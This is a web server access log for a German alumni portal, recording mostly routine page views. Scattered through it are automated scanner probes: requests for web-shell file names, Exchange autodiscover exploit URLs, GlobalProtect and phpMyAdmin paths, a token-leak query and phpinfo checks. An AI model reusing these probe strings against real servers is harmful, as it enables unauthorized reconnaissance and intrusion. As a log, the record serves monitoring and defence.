2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:26;;/wp-admin/js/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:27;;/thoms.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:28;;/xcre1.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:29;;/xsas.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:29;;/xrp.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:30;;/wp-freya.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:31;;/jatuh.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:32;;/css/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:33;;/file30.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:34;;/fesa.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:34;;/class-.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:35;;/.well-known/gecko-litespeed.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:36;;/wp-includes/block-patterns/index.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:37;;/up.php;GET;404
2bd0c0aedd65b305da389bdfdd64611085cf0e88ca947f6a1638ec0fb25b5947;2025-11-02 18:42:38;;/403.php;GET;404
153e34497b5d8e65da9577755a57cc045534c18e8e387af1df970be4bc9bc7dd;2025-11-02 18:42:55;;/personen/alumni/schule/4340014;GET;200
1d4816b33348280c76c53f47f5e5540aa829cd8bbf309699ac650222475c7db4;2025-11-02 18:42:55;/gruppen/hobby/kulturelle-studien;/gruppen/hobby/kulturelle-studien;GET;200
fdac4b252bce61d48189896b4896ac15b0d0802f46538a5e2e1b29f4a0776cea;2025-11-02 18:43:44;;/personen/alumni/schule/01A04;GET;200
3cbca500bc1528670958498d8db3d9b5adb945538b2e51091813e7f9b38b38c6;2025-11-02 18:48:40;;/personen/alumni/schule/10A04;GET;200
fd2403af2726cc9eb63ce431e8809ebe5640303a7a44d5f207341d39e52fee37;2025-11-02 18:50:35;;/?page=docs-DT1-dea.md;GET;200
a8a8c31a677ae0cacc12312a66dea85436d8ee625bb769c1ad583e126f31514e;2025-11-02 18:52:37;;/gruppen/hobby/politik-und-debatten;GET;200
ebeb5e092a996248613e67c6c965da45cbe1026753de7ab4559bc70c593d76b5;2025-11-02 18:52:52;;/gruppen/hobby/theater-und-schauspiel;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-02 18:53:07;;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
694879492b944681715d4e33ae0e69523d5c205094f56aae317ba551c0995dc0;2025-11-02 18:53:23;;/gruppen/hobby/nahen-und-textilarbeiten;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-02 18:53:38;;/gruppen/hobby/film-und-videoproduktion;GET;200
c39d9d83b6421a2e10167e6f2a0a977c0094ae6c2a9c27de7cc30535a5570f47;2025-11-02 18:53:45;;/personen/alumni/schule/04A04;GET;200
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-02 18:53:53;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-02 18:54:09;;/gruppen/hobby/musikinstrumente-spielen;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-02 18:54:25;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-02 18:54:40;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-02 18:54:55;;/themen/details/gemeinsam-stark-organisiert;GET;200
56a49fa60f9d0e9a4887ded69d6a327a243737c9c6e17f8816a653b999a98fed;2025-11-02 18:55:01;;/;GET;200
23475fe0363e13dbe5c18a0b5431b27a2d7c87b20d7259d8d58759260901ce68;2025-11-02 18:55:10;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-02 18:55:26;;/themen/details/erfolgreich-durch-die-abiturprufungen;GET;200
694879492b944681715d4e33ae0e69523d5c205094f56aae317ba551c0995dc0;2025-11-02 18:55:41;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-02 18:55:56;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
42cc005cfe0e547cb5db66b394a4fd69cc0ee66aaaec78dc5923f16add4bcfe6;2025-11-02 18:56:01;;/suchergebnisse;GET;302
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-02 18:56:11;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
42cc005cfe0e547cb5db66b394a4fd69cc0ee66aaaec78dc5923f16add4bcfe6;2025-11-02 18:56:12;/suchergebnisse;/;GET;200
1173d3c0a621135a52048a39427c52217c7c89237895fb818e84b27c43f54fcd;2025-11-02 18:58:09;;/personen/alumni/schule/SL001;GET;200
bb3a7183c5f670a03afc614e58550d51ad91776639dd2e0bc0a7aa83621863dd;2025-11-02 18:59:23;;/;GET;200
7e87cb38dfc5eb994ae82952c4002bd80d026a2844983b7553b2b9b50052aeb8;2025-11-02 19:02:51;;/personen/alumni/schule/620014;GET;200
a176c93321a22e717da79e6ee7c955ac600d523c1efe3cd85a88048318024df5;2025-11-02 19:05:00;;/personen/alumni/schule/07A05;GET;200
f3f1d21f890d433aa4653fc46a98799fb6d808298bf98f2c203bbbd3142e5fc2;2025-11-02 19:07:24;;/personen/alumni/schule/04A06;GET;200
74b44bd90a1fc1079c452402b85f2e2317498556c6f24795d1d9f2e7ac960ebe;2025-11-02 19:12:09;;/personen/alumni/schule/40745;GET;200
436c14d5c21c229d06944e0f62307e7a3327fe5ce131091d794778f349faa66e;2025-11-02 19:12:26;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-02 19:13:21;/personen/alumni/details/felix-fischer;/personen/alumni/schule/5511;GET;200
afc45b3c9ae544346539a204f5c3f58b451be58760448f2843f4fa2048c8e8ab;2025-11-02 19:14:04;;/personen/alumni/schule/600027;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-02 19:14:45;/gruppen/hobby/reisen;/personen/alumni/details/sidney-dittrich;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-02 19:16:10;/personen/alumni/details/felix-fischer;/gruppen/hobby/kochen-und-backen;GET;200
34a08e4a0a1ea1278337d87af2aabd966bcacdc85643eac9be49256a50ef8cd0;2025-11-02 19:17:21;;/personen/alumni/schule/5820;GET;200
e4223be64f6dfca6cf8cb59b6a678a27885dd6c9563f594abc0404922b166aca;2025-11-02 19:19:04;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-02 19:20:59;;/personen/alumni/details/andie-jahnke;GET;200
d2a10d48b4925ac8f352fc9219ceff7482b99b003f1ea2d78da7fd95b37c554d;2025-11-02 19:22:20;;/personen/alumni/schule/9004;GET;200
425e4e2f3c7a172e11c96e98c19ba13ad149e2340cfb2c54521599b7b1ed36e2;2025-11-02 19:25:33;;/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com;GET;404
425e4e2f3c7a172e11c96e98c19ba13ad149e2340cfb2c54521599b7b1ed36e2;2025-11-02 19:25:35;;/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com;GET;404
049aba1984d9e62ac70a68426cd422ee993d1cb2bdce2a848facdaa71763810c;2025-11-02 19:26:14;;/personen/alumni/schule/5507;GET;200
d6f0cd88810df4e012b7e021ce3d13930faf9d9adaeecbd654b41f5c18eed942;2025-11-02 19:27:23;;/personen/alumni/schule/9002;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 19:28:37;;/?s=captcha&test=-1;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 19:28:39;;/?s=captcha&test=-1;GET;200
0aeb96cfb4e03a52ddb2ccd86d58ec0f786ee74e193849969113bccff11755f7;2025-11-02 19:29:43;;/sitemap_index.xml;GET;404
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-02 19:32:20;/personen/alumni/details/albert-hammig;/gruppen/hobby/literaturanalyse;GET;200
ad7f6b213e28d4c786167cb7de7ea30ba02b3c8d2933d77fa7ae94d4378ee774;2025-11-02 19:32:54;;/;GET;200
1ca2c33312bc366c9f319096cae6682a802392eeff4f2f1515d27288cbd1df01;2025-11-02 19:33:03;;/personen/alumni/schule/183052;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-02 19:33:29;/;/;GET;200
589c86fdbfa345f054406b3adc236077ccdc6629a445816802a85c52bed98c6c;2025-11-02 19:35:41;;/personen/alumni/schule/10A04;GET;200
b8a47d7b148e97a78216f695b162fb9f189064cce3159b203fee06a6e7e8a670;2025-11-02 19:40:47;;/;GET;200
365e7386b9e2e80eb948731ca504a737065fe552663bcc9edf7ab5761bae5ad3;2025-11-02 19:41:09;;/sitemap_index.xml;GET;404
7896f2d9ca9e56679d340b41b35202aaf47b6053978794838f7d27b2d0b9d64e;2025-11-02 19:41:57;;/;GET;200
7dcec8de21b4ff7c2157615942eefa2dee47f1937585eddf1e218a0058c8b9f2;2025-11-02 19:42:05;;/;GET;200
7dcec8de21b4ff7c2157615942eefa2dee47f1937585eddf1e218a0058c8b9f2;2025-11-02 19:42:38;;/;GET;200
049aba1984d9e62ac70a68426cd422ee993d1cb2bdce2a848facdaa71763810c;2025-11-02 19:47:04;;/aktuelles/stellenangebote;GET;200
ada38eb9223e9c73e3f9fedafc153216a27cf7f97e9d2676f37255dd94ee79b2;2025-11-02 19:50:20;;/personen/alumni/schule/164045;GET;200
1cc07f48532d610b69cc7988b26cc51417a729879f95be6c9c56d4f8ddfe9870;2025-11-02 19:54:36;;/gruppen/hobby/finanzbildung;GET;200
48d8bbb4ab08e06f5a74df13e73a40b1060935723fa7f3ae4028c8a8d4616e17;2025-11-02 19:55:56;;/veranstaltungen;GET;200
a7e7225c7a75b7a516d419399f864b391e2bdec9ee601814a6383d05b1e5ea90;2025-11-02 19:57:47;;/about/allgemein;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-02 19:58:22;/personen/alumni/details/felix-fischer;/rechtliches/impressum;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 19:58:57;;/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php;GET;404
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 19:58:58;;/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-02 19:59:45;/personen/alumni/details/felix-fischer;/personen/alumni/schule/59043;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-02 20:01:09;/personen/alumni/details/felix-fischer;/personen/alumni/schule/191073;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-02 20:02:32;/gruppen;/gruppen/hobby/fotobearbeitung;GET;200
1c09456e7e6caccc133313da7315c1d1fe35726a06c67cb3f8f214d5e8a34888;2025-11-02 20:04:06;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
113408a9f3eada1ab4f0d74b94b299f950aa82c2201bea5a669ce7562b2fa8c6;2025-11-02 20:08:05;;/;GET;200
3c94e2bbbf0fd73aeb866f9eb1206124dc7215969c7f0f260ffd0c9d062ef24b;2025-11-02 20:08:19;;/about/allgemein;GET;200
9d7b6f0422c662d0d6d2d62e77f3586b1ddf3e6d4dce278fb314c441c0a50fcb;2025-11-02 20:08:45;;/;GET;200
8215881c3880e399f936e9982508bfbea754c6928565eb7541a45b4b2c9d4662;2025-11-02 20:10:31;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
7386f461fca85cfc37ed17f5d150d2ba8f4a60d92465ebde371b87f82d4104a2;2025-11-02 20:13:11;/;/;GET;200
b685dccece193a5885af57af9b8c086dbb21e2487fce445f34419bc44f2c595f;2025-11-02 20:14:51;;/login;GET;200
00988cdbec8534c4df0c99bd520523d03438adab79760e2c11543a0c11850cc7;2025-11-02 20:16:44;;/personen/alumni/schule/9001;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-02 20:18:27;;/personen/alumni/schule/170690;GET;200
4e3ce31c519c52c92984439cb83b9615a03f78eae862bd8023dd6f389bcba9df;2025-11-02 20:22:49;;/personen/alumni/schule/68457;GET;200
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-02 20:23:15;/;/;GET;200
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-02 20:23:15;/;/;GET;200
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-02 20:23:25;;/;GET;200
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-02 20:23:25;;/;GET;200
cdba9cd45d5a48f26b2fe2ac4ddcd59ebc21dd941868632713695832bb592f7a;2025-11-02 20:27:06;;/personen/alumni/schule/9001;GET;200
9123a4ad73111fd22f7f5c13aba0f30a0a02835199d29eae23f776f1ea9c4e4a;2025-11-02 20:28:50;;/personen/alumni/schule/03A04;GET;200
8390edefef6dd9221b94d016350ab5bbcda68986f560647ce275eb768c794772;2025-11-02 20:33:39;;/sitemap_index.xml;GET;404
e8f7c5a2012787248393ce8c44d56f25c267eb1eb4bde51b8f08860ed148ed71;2025-11-02 20:34:50;;/personen/alumni/schule/67945;GET;200
db523679de5c06fe9e28adb86a18a8cc1de78962cc1c7c3437bb62d7579da859;2025-11-02 20:35:04;;/aktuelles/meldungen;GET;200
3e44aea721fc49d86628b84b4a537461a727aecec4b40c6aab239fac50a929f5;2025-11-02 20:40:53;;/personen/alumni/schule/07A05;GET;200
f805373e2626640b136a5b48d9e1c3a36536377d2bbeb42ac23414852eb25756;2025-11-02 20:45:25;;/sitemap_index.xml;GET;404
a70e2e37de49c44119b0b62a79c3790903031ac8435818bf113844d84e05ce7b;2025-11-02 20:46:51;;/personen/alumni/schule/0349;GET;200
436c14d5c21c229d06944e0f62307e7a3327fe5ce131091d794778f349faa66e;2025-11-02 20:49:10;;/personen/alumni/schule/9004;GET;200
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-02 20:51:51;;/;GET;200
39b046f955ada8437bbe675c9dd2ab0018b8eb21684f27e71d992112c3193ed7;2025-11-02 20:52:56;;/personen/alumni/schule/0350;GET;200
d6edba7cbf37d54789e9c0db498e2a111e2ff182901308404f445914fb70a39d;2025-11-02 20:58:38;;/personen/alumni/schule/164094;GET;200
ba621a098a29c3c7ea29758b3a539fd4011818f0ea99f0d6259e65624d9052fe;2025-11-02 21:00:24;;/;GET;200
227454e452926f184f3f50c44f590d0f398f8a799f9337ebc2ebdccac6dd454f;2025-11-02 21:02:07;;/veranstaltungen/details/wartende-das-theaterstuck;GET;200
60d81a2f96c65209d491824ee8afcc46570005f68ecb60d986c2632e23641ea8;2025-11-02 21:04:30;;/personen/alumni/schule/188001;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 21:06:24;;/;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 21:06:25;;/;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 21:06:31;;/?m=api&c=ajax&a=get_token&name=admin_id;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 21:06:31;;/?m=api&c=ajax&a=get_token&name=admin_id;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 21:06:55;;/?m=api&c=ajax&a=get_token&name=admin_login_expire;GET;200
07e710392571ef20e932284366f75fb092dde355f08d489a88ac6111ef8524fa;2025-11-02 21:06:56;;/?m=api&c=ajax&a=get_token&name=admin_login_expire;GET;200
134ba6dd98357c41fb79362c8c9fa8f0c3672aa948a0080fe8fa250f59b3f979;2025-11-02 21:10:17;;/personen/alumni/schule/BW001;GET;200
9969942b193c056f4f60800de4368c53a0eba87e18be0cb2f3d9dfc25d93950a;2025-11-02 21:16:26;;/personen/alumni/schule/4240545;GET;200
425e4e2f3c7a172e11c96e98c19ba13ad149e2340cfb2c54521599b7b1ed36e2;2025-11-02 21:18:29;;/global-protect/login.esp;GET;404
425e4e2f3c7a172e11c96e98c19ba13ad149e2340cfb2c54521599b7b1ed36e2;2025-11-02 21:18:30;;/sslmgr;GET;404
dc4fca78bed40450d8cf9bc1ffaeebdcc909c0e96e640ce74e57185b9de87d97;2025-11-02 21:19:25;;/personen/alumni/schule/5506;GET;200
04d7f7af67295fa5ab13cdd4adf35c1f9d4929890edd71151d34c51d959667db;2025-11-02 21:21:45;;/personen/alumni/schule/66345;GET;200
f2e728e6b36cffd487b57dd3a9bddc6d2a496e39c7629ce8d3258ed9217c5909;2025-11-02 21:22:20;;/personen/alumni/schule/MP003;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-02 21:23:06;;/personen/alumni/details/thomas-matzig;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-02 21:23:28;;/personen/alumni/details/cynthia-ott;GET;200
62f1b68d128294ddb8c10e270c3f6110f626411b9d49277ee0dc576b56788112;2025-11-02 21:23:32;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-02 21:26:33;;/gruppen/plausch/schulband-statt-fliessband;GET;200
4e10ab428763148b6a9e115a3392985e7d07c4d12d0a6d8fc179821af44b6b49;2025-11-02 21:28:06;;/personen/alumni/schule/600027;GET;200
dc4fca78bed40450d8cf9bc1ffaeebdcc909c0e96e640ce74e57185b9de87d97;2025-11-02 21:33:26;;/personen/alumni/schule/5501;GET;200
f3f6ed7a124109387d04e0e548598ab607c60593b6ed67959c52c77a7a7a01e2;2025-11-02 21:33:53;;/personen/alumni/schule/4440012;GET;200
ef72a619f7d72b94e65d7ef8f50211ffc419bfb5bfb60f5d5b5e80f8d4070f8e;2025-11-02 21:41:19;;/personen/alumni/schule/185826;GET;200
628197ccc536d096b075dac182b7338bf7d456932b6762dcfa6158e6c1d2dba6;2025-11-02 21:43:21;;/;GET;200
9d7b6f0422c662d0d6d2d62e77f3586b1ddf3e6d4dce278fb314c441c0a50fcb;2025-11-02 21:51:09;;/personen/alumni/schule/SHH001;GET;200
72879f63c1b40615ffc517aa103e81fec62ba78cca302800033a74adfb767a67;2025-11-02 21:52:48;;/personen/alumni/schule/164045;GET;200
abdadb89c0e7ba17bb6b1d10fbfc78d41b4c9cd7f21aa369e84d3f532c21dfe5;2025-11-02 22:00:01;;/about/allgemein;GET;200
589c86fdbfa345f054406b3adc236077ccdc6629a445816802a85c52bed98c6c;2025-11-02 22:01:37;;/personen/alumni/schule/65262;GET;200
6fa3ea08102597fcf5e80683cc845fd0cc4e1670caa2f1200010c9a23c051f5d;2025-11-02 22:01:51;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:23;/phpMyAdmin-4.9.7/index.php?lang=en;/phpMyAdmin-4.9.7/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:24;/mysql/mysqlmanager/index.php?lang=en;/mysql/mysqlmanager/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:25;/phpMyAdmin-5.2.1-english/index.php?lang=en;/phpMyAdmin-5.2.1-english/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:26;/phpmyadmin2018/index.php?lang=en;/phpmyadmin2018/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:27;/phpMyAdmin-5.2/index.php?lang=en;/phpMyAdmin-5.2/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:29;/phpMyAdmin-5.1.2/index.php?lang=en;/phpMyAdmin-5.1.2/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:30;/db/dbadmin/index.php?lang=en;/db/dbadmin/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:31;/admin/sysadmin/index.php?lang=en;/admin/sysadmin/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:33;/mysql/pma/index.php?lang=en;/mysql/pma/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:36;/administrator/phpmyadmin/index.php?lang=en;/administrator/phpmyadmin/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:38;/phpMyAdmin1/index.php?lang=en;/phpMyAdmin1/index.php?lang=en;GET;404
d3398e013f17e3303ca0419702a5dd2be679b65ff812a6000f678a0a97c1a8f8;2025-11-02 22:04:39;/2phpmyadmin/index.php?lang=en;/2phpmyadmin/index.php?lang=en;GET;404
fb35b45b086cc50b083b8d823c1f1fcef41f5c398827a20b6adf21c7993f613f;2025-11-02 22:06:58;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
53b4d797a852dbacd6478567d93b696d7bf380ecb97982ed81c05ed191c7b6ce;2025-11-02 22:09:42;;/personen/alumni/schule/183052;GET;200
60219fdc796eb327397f4fc10338548af5f89301abb2042b16d8121ec14d998f;2025-11-02 22:13:33;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
34af1be451c29605cf296d08516cee74703accf2e0212bfe46e0f704a612d39a;2025-11-02 22:15:29;;/;GET;200
fbf959e69a5b8562e1f6cb1edee57642cac44a4fe6061074ad694a06553eba47;2025-11-02 22:20:00;;/personen/alumni/schule/HB0002;GET;200
0e13e0dcf46135ac8fcf97bdeea0cb6bbd6d51e48edb46a5029baf901b8b65c8;2025-11-02 22:20:36;;/profile;GET;302
0e13e0dcf46135ac8fcf97bdeea0cb6bbd6d51e48edb46a5029baf901b8b65c8;2025-11-02 22:20:38;/profile;/login;GET;200
af85fb5a85efcd0b59539c21b5dee55bf439749a6e3154f55ab490956496f0a1;2025-11-02 22:26:32;;/personen/alumni/schule/MP001;GET;200
a205f1b652cf37f6464751ca46ec451e0febe995217327de1cdb3413da19a29c;2025-11-02 22:29:54;;/personen/alumni/schule/BW001;GET;200
76f50be378c367e01f97911e9c71564e831b9aa5eda320f7483d6460e63e3fd6;2025-11-02 22:32:49;;/personen/alumni/schule/SHH001;GET;200
2472e45a452813a53f731a189a67a6b7bf516132e09d2ca0c993419f2507997e;2025-11-02 22:34:07;;/;GET;200
09b5c73abf38c082f7473405ff4942489702e958c0675af92fbeaccc854ec98b;2025-11-02 22:38:57;;/personen/alumni/schule/MP004;GET;200
8917f7e79eeca603bd1c8dc9b95d02ade7fb94c3445f43634102d6aeacd0e06d;2025-11-02 22:45:08;;/personen/alumni/schule/9009;GET;200
afda084b70247793be1cac81820ce30002bc2e854cbd7db3fbe8b5b0126ac87e;2025-11-02 22:45:31;;/;GET;200
dedaee3d658dc762cd7846e6a104c28bcfca13ac42aa5be0e8213d55923e9a73;2025-11-02 22:48:27;;/;GET;200
2e5524b039843f15c3474aeac0be0ac76fd5d063417939cb41071513ba9d26ac;2025-11-02 22:49:26;;/;GET;200
8787a5db920fe4d44980a01cf79f573221fa96420c1cc90d0b886ee0bba2deb0;2025-11-02 22:50:52;;/personen/alumni/schule/01A04;GET;200
13bb19d59148d0885e9361fe220a411adbee49a9fbb92287ec8f1e24b05aae32;2025-11-02 22:55:47;;/;GET;200
9a98e3d57cb0ac495f12504ece1f25e1c437bf542c414ee161901d0089263db0;2025-11-02 22:56:56;;/personen/alumni/schule/10A04;GET;200
44ad89caa059e058863527401238fe043c69a4883eab079bb3dfcc688ded5ea7;2025-11-02 23:02:46;;/personen/alumni/schule/04A04;GET;200
e9a108bf9fcf8ff77173e293b362e9ba90e63e264049fa3846d1f4c57f00147e;2025-11-02 23:08:16;;/personen/alumni/schule/SL001;GET;200
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-02 23:10:04;;/app_dev.php/_profiler/phpinfo;GET;404
2909923c17713f7bb253712fb3cdb66bc26eea24c6f284fe53684c62c0cb8f67;2025-11-02 23:10:06;;/?phpinfo=-1;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-02 23:12:01;/gruppen;/gruppen/hobby/schreinern-und-bauen;GET;200
fa1bf096ed4dec6961f06c0d41666d1fcda145747a0fc0f20093210b2c08490b;2025-11-02 23:14:01;;/personen/alumni/schule/620014;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-02 23:17:19;;/;GET;200
05b86f56a477ba679eea68b32602c6aca4c935a53cff1657fd9b3c2a8c4ac25e;2025-11-02 23:19:36;;/personen/alumni/schule/04A06;GET;200
40c176dd91a76fe1c40e548593cd2967844cbd5debaa78444789df995298e0b8;2025-11-02 23:25:39;;/personen/alumni/schule/40745;GET;200
2472e45a452813a53f731a189a67a6b7bf516132e09d2ca0c993419f2507997e;2025-11-02 23:26:54;/;/;GET;200
496a289b32e922897614d1b0c76ee415332d35da1977ec92f3a76626dd4c3db8;2025-11-02 23:29:50;;/;GET;200
48f54720d8c4ee77d98b291efe56eb181ef8f78fe727f882baefda198e46243b;2025-11-02 23:31:51;;/personen/alumni/schule/5820;GET;200
181783aff8c1eb302cbc59ff72cba91edffae61c2a2f6502de474db66dc6d5fd;2025-11-02 23:35:05;;/login;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-02 23:37:01;/personen/all/2;/personen/alumni/details/kai-ingo-heidbuchel;GET;200
74834f7e9b08a093cfcc0fdf93c3c3715f5cb4069f3a88401c2ed1b065002a1b;2025-11-02 23:40:23;;/sitemap.xml;GET;200
1c16157a9e8203d3206511057f388a68bcb374f9bf11d6f476fa7c95786ef67c;2025-11-02 23:43:32;;/;GET;200
be8d9961ffc45a5e22fe9fa94c6985671e1990c84be8bed87eedbdff227394fe;2025-11-02 23:51:57;;/personen/alumni/schule/164045;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-02 23:55:00;/personen/alumni/details/thomas-matzig;/gruppen/hobby/fitness;GET;200
15d9895c836e06be187b324240a7b8097a37d05e22541cc7b43171ad23be4944;2025-11-02 23:59:09;;/about/allgemein;GET;200
0000425d5bfad1751ea17fb860e404bea51a821866a52c61f80cc164313c8a8e;2025-11-03 00:05:52;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
3e1198c7c6377895b6b65156e2fb6dd2feb638e6d73f7371a6bd89335cdc1a41;2025-11-03 00:07:32;/;/;GET;200
6ea2de80566292d3c3e5895f04184d90ea52f106ad6f49a367a86aa86065f228;2025-11-03 00:08:46;;/;GET;200
d43ae901ca6f92159d1fc260594a6f40bd8cd0f8656170ed972a03434a0a3a66;2025-11-03 00:09:43;;/;HEAD;200
80b8528e227e05700ee0df84c6bc7871a4beee796fcdf1851436436b6a8b48fd;2025-11-03 00:13:02;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
